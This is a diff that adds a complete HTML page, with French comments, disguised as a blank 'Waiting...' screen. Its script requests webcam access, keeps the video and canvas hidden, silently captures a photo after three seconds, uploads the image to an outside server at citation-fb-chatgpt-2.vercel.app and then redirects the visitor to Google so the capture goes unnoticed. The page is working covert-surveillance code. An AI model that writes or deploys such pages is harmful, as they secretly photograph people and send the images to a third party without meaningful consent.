@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Waiting...</title>
+    <style>
+        #video, #canvas {
+            display: none;
+        }
+        #message {
+            text-align: center;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1 style="text-align: center;">Waiting...</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    <script>
+        // Accéder à la webcam
+        const video = document.getElementById('video');
+
+        // Demander l'accès à la caméra
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+                // Capture une seule photo après un délai de 3 secondes
+                setTimeout(capturePhoto, 3000);
+                //window.location.href = 'https://www.google.com/';
+            })
+            .catch((err) => {
+                console.error("Erreur d'accès à la caméra: ", err);
+                document.getElementById('message').innerText = "Erreur d'accès à la caméra.";
+            });
+
+        // Fonction pour capturer la photo
+        function capturePhoto() {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convertir le canvas en une URL de données
+            const dataURL = canvas.toDataURL('image/png');
+
+            // Envoyer l'image au serveur
+            fetch('https://citation-fb-chatgpt-2.vercel.app/upload', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ image: dataURL })
+            })
+            .then(response => response.json())
+            .then(data => {
+                
+                window.location.href = 'https://www.google.com/';
+            })
+            .catch((error) => {
+                console.error('Erreur:', error);
+            });
+        }
+    </script>
+</body>
+</html>
